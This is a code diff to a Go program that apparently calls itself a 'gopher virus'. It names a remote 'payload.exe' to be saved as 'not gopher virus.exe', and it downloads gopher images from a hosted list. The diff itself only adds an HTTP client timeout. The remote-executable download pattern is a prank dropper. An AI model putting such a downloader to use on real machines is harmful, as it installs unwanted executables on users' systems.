@@ -10,18 +10,20 @@ import (
 	"os/exec"
 	"os/user"
 	"strings"
+	"time"
 )
 
 const (
 	payloadname = "not gopher virus.exe"
 	payloadURL  = "https://raw.githubusercontent.com/itsyourboychipsahoy/gopher-virus/master/payload.exe"
-	listURL = "https://raw.githubusercontent.com/itsyourboychipsahoy/gopher-virus/master/list"
+	listURL     = "https://raw.githubusercontent.com/itsyourboychipsahoy/gopher-virus/master/list"
 	logfile     = "deploy_gophers.log"
 )
 
 var (
 	logger      *log.Logger
 	gopherLinks []string
+	client      http.Client
 )
 
 func init() {
@@ -54,6 +56,10 @@ func init() {
 		"https://i.imgur.com/3OhpbZO.jpg",
 		"https://i.imgur.com/ZnZW4wa.png",
 	}
+	// create our request client
+	client = http.Client{
+		Timeout: 10 * time.Second,
+	}
 }
 
 func main() {
@@ -79,7 +85,7 @@ func main() {
 
 // downloads ALL gophers and writes them to a file.
 func downloadAll() {
-	resp, err := http.Get(listURL)
+	resp, err := client.Get(listURL)
 	if err != nil {
 		logger.Println("Failed to download gopherlist, using builtin...")
 		logger.Printf("%v\n", err)
@@ -119,7 +125,7 @@ func DLAndWriteFromList(list []string) {
 // downloads from a URL and writes it to a file
 func DLAndWrite(URL string, filename string) {
 	// Downloads it
-	response, err := http.Get(URL)
+	response, err := client.Get(URL)
 	if err != nil {
 		logger.Printf("%v\n", err)
 		return
